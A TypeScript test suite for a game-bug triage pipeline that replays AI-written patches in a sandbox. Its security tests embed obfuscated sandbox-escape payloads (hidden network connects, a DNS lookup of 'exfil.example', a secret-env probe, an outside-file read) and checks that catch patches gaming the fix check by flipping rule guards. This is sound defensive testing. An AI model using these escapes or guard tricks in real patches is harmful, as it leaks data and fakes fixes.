// Fixture tests for the live triage flow: the apply + replay half runs the real engine on recorded bug seeds (no network,
// no model: `ask` is faked). ~5 s, four child processes.   npx tsx --test lib/triage-live.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { applyPatches, editsForcedRule, makeScratch, playRound, signatureOf, TriageError, triageRound, validateTriageBody } from "./triage-live";
import { fighterFor } from "./replay-token";
import type { Persona, RunLine, Tuning } from "./types";

const ROOT = process.cwd();
// The rules the recorded data predates, read from the data so a newly added fix flag cannot leave this test replaying the wrong build.
const RECORDED: Tuning = JSON.parse(readFileSync(join(ROOT, "data/run-main/meta.json"), "utf8")).recordedWith;
const personas = new Map((JSON.parse(readFileSync(join(ROOT, "data/run-main/personas.json"), "utf8")) as Persona[]).map((p) => [p.id, p]));
const runs = new Map(readFileSync(join(ROOT, "data/run-main/runs.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l) as RunLine).map((r) => [`${r.p}:${r.round}`, r]));
const bug4 = runs.get("p0653:2")!;           // stuck:KNOCKDOWN+airborne+softlock, seed 529060
const bug4Patch = JSON.parse(readFileSync(join(ROOT, "data/run-main/fixes/bug4.json"), "utf8")).patches;
const ask = (answer: object) => async () => ({ title: "t", isRealBug: true, severity: "high" as const, rootCause: "ground.js:41", playerImpact: "", patches: [], confidence: 0.7, model: "fake", tokensIn: 1, tokensOut: 1, ...answer });

test("signatureOf matches the cluster signatures engine/bugs.mjs wrote", () => {
  assert.equal(signatureOf(bug4.ev), "stuck:KNOCKDOWN+airborne+softlock");
  assert.equal(signatureOf(runs.get("p0537:1")!.ev), "oob+airborne+softlock");
  assert.equal(signatureOf([[1, "hit", 0], [2, "crash", 0, "RuntimeError: x"], [3, "airborne", 1]]), "crash:RuntimeError: x+airborne");
  assert.equal(signatureOf([[1, "hit", 0]]), "");
});

test("validateTriageBody accepts {p, round} only", () => {
  assert.deepEqual(validateTriageBody({ p: "p0653", round: 2 }), { p: "p0653", round: 2 });
  for (const bad of [{}, { p: "p0653" }, { p: "../x", round: 2 }, { p: "p0653", round: "2" }, { p: "p0653", round: 2.5 }, { p: "p0653", round: 0 }, { p: "p0653", round: 2, seed: 1 }]) {
    const v = validateTriageBody(bad);
    if ("error" in v) assert.equal(v.status, 400); else assert.deepEqual(v, { p: "p0653", round: 2 }, "extra keys are ignored, nothing else from the client is used");
  }
});

test("applyPatches: exactly-once find, game/src/*.js only, no traversal", () => {
  const dir = mkdtempSync(join(tmpdir(), "triage-test-"));
  writeFileSync(join(dir, "a.js"), "x = 1;\ny = 2;\ny = 2;\n");
  assert.deepEqual(applyPatches(dir, [{ file: "a.js", find: "x = 1;", replace: "x = 10;" }]), [{ file: "a.js", ok: true }]);
  assert.equal(readFileSync(join(dir, "a.js"), "utf8"), "x = 10;\ny = 2;\ny = 2;\n");
  assert.deepEqual(applyPatches(dir, [{ file: "a.js", find: "y = 2;", replace: "" }]), [{ file: "a.js", ok: false, why: "find text matches 2 times" }]);
  assert.deepEqual(applyPatches(dir, [{ file: "a.js", find: "nope", replace: "" }]), [{ file: "a.js", ok: false, why: "find text not found" }]);
  assert.deepEqual(applyPatches(dir, [{ file: "../a.js", find: "x", replace: "" }, { file: "b.js", find: "x", replace: "" }]).map((a) => a.ok), [false, false]);
  rmSync(dir, { recursive: true, force: true });
});

test("playRound reproduces the recorded bug4 round and its evidence window matches bugs.json", async () => {
  const persona = personas.get("p0653")!;
  const r = await playRound(join(ROOT, "engine"), { seed: bug4.seed, fighter: fighterFor("p0653"), tuning: RECORDED, persona, window: [14.5, 20.5] });
  assert.deepEqual([r.out, r.t], [bug4.out, bug4.t]);
  assert.deepEqual(r.ev.filter((e) => ["airborne", "stuck", "softlock"].includes(e[1])), bug4.ev.filter((e) => ["airborne", "stuck", "softlock"].includes(e[1])));
  const offline = JSON.parse(readFileSync(join(ROOT, "data/run-main/bugs.json"), "utf8")).find((b: { id: string }) => b.id === "bug4").timeline as string[];
  assert.deepEqual(r.timeline, offline);
});

test("the bug4 fixture patch applied in a scratch copy makes the same seed run clean; the repo's game/src is untouched", async () => {
  const before = readFileSync(join(ROOT, "game/src/ground.js"), "utf8");
  const scratch = makeScratch(ROOT);
  try {
    assert.deepEqual(applyPatches(join(scratch, "game/src"), bug4Patch), [{ file: "ground.js", ok: true }]);
    const r = await playRound(join(scratch, "engine"), { seed: bug4.seed, fighter: fighterFor("p0653"), tuning: RECORDED, persona: personas.get("p0653")! });
    assert.equal(r.ev.filter((e) => ["airborne", "stuck", "softlock", "oob", "crash", "clip", "nan"].includes(e[1])).length, 0);
    assert.equal(r.t, 18.73, "same outcome engine/verify-fix.mjs recorded in fixes/bug4.verify.json");
  } finally { rmSync(scratch, { recursive: true, force: true }); }
  assert.equal(readFileSync(join(ROOT, "game/src/ground.js"), "utf8"), before);
});

test("triageRound: fixed / patch-did-not-apply / not-a-bug / broken patch, with a faked Ultra", async () => {
  const input = { run: bug4, persona: personas.get("p0653")!, tuning: RECORDED, sameSignature: [bug4] };
  const fixed = await triageRound(input, { ask: ask({ patches: bug4Patch }) });
  assert.equal(fixed.verdict, "fixed");
  assert.deepEqual([fixed.before.bugs, fixed.before.bugEvents, fixed.after?.bugEvents], [["airborne", "stuck", "softlock"], 3, 0]);
  assert.equal(fixed.signature, "stuck:KNOCKDOWN+airborne+softlock");
  assert.equal(fixed.timeline.length, 68, "66 evidence rows behind a TUNING row and a FIRED row");
  assert.match(fixed.timeline[0], /^TUNING rules\.mountReleaseFix=0 .*not credited/);
  assert.match(fixed.timeline[1], /^FIRED airborne \(player\) at 18\.5s; stuck:KNOCKDOWN \(player\) at 26s; softlock:stalemate \(player\) at 41s\. .*14\.5-20\.5 s/);
  assert.ok(fixed.ms.total > 0);

  const miss = await triageRound(input, { ask: ask({ patches: [{ file: "ground.js", find: "this text is not in ground.js", replace: "" }] }) });
  assert.equal(miss.verdict, "patch-did-not-apply");
  assert.deepEqual(miss.applied, [{ file: "ground.js", ok: false, why: "find text not found" }]);
  assert.equal(miss.after, null);

  const legit = await triageRound(input, { ask: ask({ isRealBug: false }) });
  assert.deepEqual([legit.verdict, legit.after, legit.applied], ["not-a-bug", null, []]);

  const broken = await triageRound(input, { ask: ask({ patches: [{ file: "ground.js", find: "export const GROUND_RULES", replace: "export const GROUND_RULES = (" }] }) });
  assert.equal(broken.verdict, "not-fixed");
  assert.match(broken.afterError ?? "", /patched game did not run/);
});

test("triageRound turns model failures into readable errors with a status", async () => {
  const input = { run: bug4, persona: personas.get("p0653")!, tuning: RECORDED, sameSignature: [bug4] };
  const fails = (e: Error) => async () => { throw e; };
  const timeout = Object.assign(new Error("The operation was aborted due to timeout"), { name: "TimeoutError" });
  await assert.rejects(triageRound(input, { ask: fails(timeout), timeoutMs: 40_000 }), (e: TriageError) => e.status === 504 && /within 40 s/.test(e.message));
  await assert.rejects(triageRound(input, { ask: fails(Object.assign(new Error("HTTP 429: slow down"), { status: 429 })) }), (e: TriageError) => e.status === 503);
  await assert.rejects(triageRound(input, { ask: fails(new Error("triage answer failed validation 1 time; last: patch 0: find text occurs 0 times")) }), (e: TriageError) => e.status === 502 && /find text occurs 0 times/.test(e.message));
  await assert.rejects(triageRound({ ...input, run: { ...bug4, ev: [[1, "hit", 0]] } }, { ask: ask({}) }), (e: TriageError) => e.status === 422);
});

test("A2: a replay that hits its timeout becomes TriageError 504, never a plain error (the route would answer 500)", async () => {
  const input = { run: bug4, persona: personas.get("p0653")!, tuning: RECORDED, sameSignature: [bug4] };
  let asked = false;
  await assert.rejects(triageRound(input, { ask: async () => { asked = true; throw new Error("unreachable"); }, replayTimeoutMs: 50 }),
    (e: unknown) => e instanceof TriageError && e.status === 504 && /replay did not finish/.test(e.message));
  assert.equal(asked, false, "no model call after a replay timeout");
});

// ---------- sandbox for model-written patches (security review 2026-10-28) ----------
test("patch screen refuses patches that add process, module, network or eval access", async () => {
  const { addsUnsafe } = await import("./triage-live");
  assert.equal(addsUnsafe("x = 1;", "x = fetch('http://x');"), true);
  assert.equal(addsUnsafe("if (a) {", "if (a) { process.exit(1);"), true);
  assert.equal(addsUnsafe("y = 2;", "y = globalThis.z;"), true);
  assert.equal(addsUnsafe("import { a } from './b.js';", "import { a } from './b.js';"), false, "keeping an existing import is fine");
  assert.equal(addsUnsafe("if (prop.rigidBody) {", "if (prop.rigidBody && !prop.isBroken) {"), false);
});

test("a patched replay runs without secrets and cannot read files outside its scratch copy", async () => {
  const { makeScratch, playRound } = await import("./triage-live");
  const { readFileSync, writeFileSync, rmSync } = await import("node:fs");
  const { join } = await import("node:path");
  const persona = JSON.parse(readFileSync("data/run-main/personas.json", "utf8")).find((p: { id: string }) => p.id === "p0537");
  const job = { seed: 634310, fighter: "kai" as const, tuning: null, persona };
  const s = makeScratch(process.cwd());
  try {
    const src = join(s, "game/src/tuning.js"), orig = readFileSync(src, "utf8");
    writeFileSync(src, orig + `\nif (Object.keys(process.env).some((k) => /KEY|TOKEN|SECRET/.test(k))) throw new Error("secret visible");`);
    const ok = await playRound(join(s, "engine"), job);
    assert.ok(ok.out, "benign patched replay runs and sees no secret-named env vars");
    writeFileSync(src, orig + `\nconst fs = await import("node:fs"); fs.readFileSync(${JSON.stringify(join(process.cwd(), "package.json"))}, "utf8");`);
    await assert.rejects(playRound(join(s, "engine"), job), /restricted|permission/i, "reading a file outside the scratch copy is blocked");
  } finally { rmSync(s, { recursive: true, force: true }); }
});

test("a patched replay cannot reach the network, even by routes a keyword screen misses", async () => {
  const { makeScratch, playRound } = await import("./triage-live");
  const net = await import("node:net");
  const { readFileSync, writeFileSync, rmSync } = await import("node:fs");
  const { join } = await import("node:path");
  const dgram = await import("node:dgram");
  let connections = 0, packets = 0;
  const udp = dgram.createSocket("udp4"); udp.on("message", () => packets++);
  await new Promise<void>((r) => udp.bind(0, "127.0.0.1", r));
  const port = udp.address().port;
  const server = net.createServer((c) => { connections++; c.end(); });
  await new Promise<void>((r) => server.listen(port, "127.0.0.1", r));
  const persona = JSON.parse(readFileSync("data/run-main/personas.json", "utf8")).find((p: { id: string }) => p.id === "p0537");
  const job = { seed: 634310, fighter: "kai" as const, tuning: null, persona };
  const attacks = [
    `await new Promise((r, j) => process.getBuiltinModule("net").connect(${port}, "127.0.0.1", r).on("error", j));`,
    `const n = await (function(){}).constructor('return import("node:n" + "et")')(); await new Promise((r, j) => n.connect(${port}, "127.0.0.1", r).on("error", j));`,
    `await globalThis["\\u0066etch"]("http://127.0.0.1:${port}");`,
    `const d = process.getBuiltinModule("dns"); const r = new d.Resolver({ timeout: 300, tries: 1 }); r.setServers(["127.0.0.1:${port}"]); await new Promise((res, j) => r.resolveTxt("exfil.example", (e) => e ? j(e) : res()));`,
  ];
  const s = makeScratch(process.cwd());
  try {
    const src = join(s, "game/src/tuning.js"), orig = readFileSync(src, "utf8");
    for (const a of attacks) {
      writeFileSync(src, orig + "\n" + a);
      await assert.rejects(playRound(join(s, "engine"), job), /network is disabled|not a function|not a constructor|fetch is not defined/, a.slice(0, 40));
    }
  } finally { rmSync(s, { recursive: true, force: true }); server.close(); udp.close(); }
  assert.equal(connections, 0, "no attack reached the local TCP server");
  assert.equal(packets, 0, "no DNS packet reached the local UDP server");
});

test("a patch that only flips a rule the replay forces off is not credited as a fix", async () => {
  const input = { run: bug4, persona: personas.get("p0653")!, tuning: { ...RECORDED, "rules.mountReleaseFix": 0 }, sameSignature: [bug4] };
  const src = readFileSync(join(ROOT, "game/src/ground.js"), "utf8");
  const line = src.split("\n").find((l) => l.includes("if(RULES.mountReleaseFix){"))!;
  const r = await triageRound(input, { ask: ask({ patches: [{ file: "ground.js", find: line.trim(), replace: line.trim().replace("if(RULES.mountReleaseFix){", "{") }] }) });
  assert.equal(r.verdict, "reused-shipped-fix");
  assert.equal(r.after, null, "no replay is run for it");
});

test("live triage gives Ultra two attempts, so a patch that fails validation gets one corrected retry", async () => {
  const input = { run: bug4, persona: personas.get("p0653")!, tuning: RECORDED, sameSignature: [bug4] };
  let opts: { attempts?: number } | undefined;
  const spy = async (...a: unknown[]) => { opts = a[3] as { attempts?: number }; throw new Error("triage answer failed validation 2 times; last: patch 0: find text occurs 0 times"); };
  await assert.rejects(triageRound(input, { ask: spy as never }), (e: TriageError) => e.status === 502 && /2 tries/.test(e.message) && !/no retry/.test(e.message));
  assert.equal(opts?.attempts, 2);
});

test("security: only an error that cost nothing is refundable; a replay that already ran stays counted", async () => {
  const input = { run: bug4, persona: personas.get("p0653")!, tuning: RECORDED, sameSignature: [bug4] };
  // The round shows no bug when replayed with today's game (no recorded rules): the CPU-heavy baseline replay ran, then it stopped.
  const clean = await triageRound({ ...input, tuning: { "rules.knockdownOnPropFix": 1 } }, { ask: ask({}) }).then(() => null, (e: TriageError) => e);
  assert.ok(clean instanceof TriageError && clean.status === 409, "did not reproduce");
  assert.equal(clean.free, false, "a replay ran, so the call is not refundable");
  assert.equal(clean.modelCalled, false);
  const noBug = await triageRound({ ...input, run: { ...bug4, ev: [[1, "hit", 0]] } }, { ask: ask({}) }).then(() => null, (e: TriageError) => e);
  assert.equal(noBug?.status, 422);
  assert.equal(noBug?.free, true, "refused before any replay: nothing was spent");
});

test("editsForcedRule: a patch that changes a forced-off RULES guard is caught; one that only sits next to it is not", () => {
  const off = ["mountReleaseFix"];
  const line = "if(RULES.mountReleaseFix){f.rigidBody?.sleep();f.rigidBody?.wakeUp()}f.attackQueue=[];";
  const p = (replace: string) => ({ file: "ground.js", find: line, replace });
  assert.equal(editsForcedRule(p("f.rigidBody?.sleep();f.rigidBody?.wakeUp();f.attackQueue=[];"), off), true, "guard removed");
  assert.equal(editsForcedRule(p(line.replace("RULES.mountReleaseFix", "true")), off), true, "guard forced on");
  assert.equal(editsForcedRule(p(line.replace("RULES.mountReleaseFix", "RULES.mountReleaseFix||1")), off), true, "guard widened");
  assert.equal(editsForcedRule(p(line.replace("f.attackQueue=[];", "f.rigidBody?.setLinvel({x:0,y:0,z:0},true);f.attackQueue=[];")), off), false, "new code outside the guard, guard untouched");
  assert.equal(editsForcedRule({ file: "ground.js", find: "f.animSpeed=1;", replace: "f.animSpeed=2;" }, off), false);
  assert.equal(editsForcedRule({ file: "ground.js", find: "x=1;", replace: "x=RULES.mountReleaseFix;" }, off), true, "adds a use of the forced-off rule");
});

test("editsForcedRule: an inverted guard or one forced on with a prefix counts as editing the rule", () => {
  const off = ["mountReleaseFix"];
  const find = "if(RULES.mountReleaseFix){f.rigidBody?.sleep()}f.attackQueue=[];";
  const p = (replace: string) => ({ file: "ground.js", find, replace });
  assert.equal(editsForcedRule(p(find.replace("if(RULES", "if(!RULES")), off), true, "inverted guard");
  assert.equal(editsForcedRule(p(find.replace("if(RULES", "if(1||RULES")), off), true, "1||RULES.x");
  assert.equal(editsForcedRule(p(find.replace("if(RULES", "if(true||RULES")), off), true, "true||RULES.x");
  assert.equal(editsForcedRule(p(find.replace("RULES.mountReleaseFix", "true")), off), true, "direct edit of the guard");
  assert.equal(editsForcedRule(p(find.replace("attackQueue=[]", "attackQueue=[1]")), off), false, "neighbouring statement only");
  assert.equal(editsForcedRule(p(find.replace("sleep()", "sleep();f.x=1")), off), false, "change inside the guarded body only");
});

test("a line-range patch whose lines merely contain a guard is replayed, not refused", async () => {
  const input = { run: bug4, persona: personas.get("p0653")!, tuning: RECORDED, sameSignature: [bug4] };
  const src = readFileSync(join(ROOT, "game/src/ground.js"), "utf8");
  const line = src.split("\n").find((l) => l.includes("if(RULES.mountReleaseFix){"))!;
  const r = await triageRound(input, { ask: ask({ patches: [{ file: "ground.js", find: line, replace: line.replace("f.animSpeed=1;", "f.animSpeed=1;/*noop*/") }] }) });
  assert.equal(r.verdict, "not-fixed");
});
